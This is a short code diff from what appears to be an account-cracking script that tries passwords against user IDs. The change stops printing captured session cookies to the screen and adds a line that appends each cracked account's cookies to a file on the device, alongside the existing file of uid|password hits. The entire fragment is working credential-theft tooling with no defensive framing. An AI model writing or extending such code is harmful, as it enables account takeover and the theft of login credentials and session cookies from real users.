@@ -570,11 +570,9 @@ def gxds_files(uid, pxss):
                     + ps
                     + " -\033[0;33m "
                     + yxxr(uid)
-                    + "\n\033[1;32m [COOKIES]"
-                    + xcki
-                    + "\n\033[1;30m ————————————————————————————————————————"
                 )
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
+                open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
                 oks.append(uid)
                 break
             else:
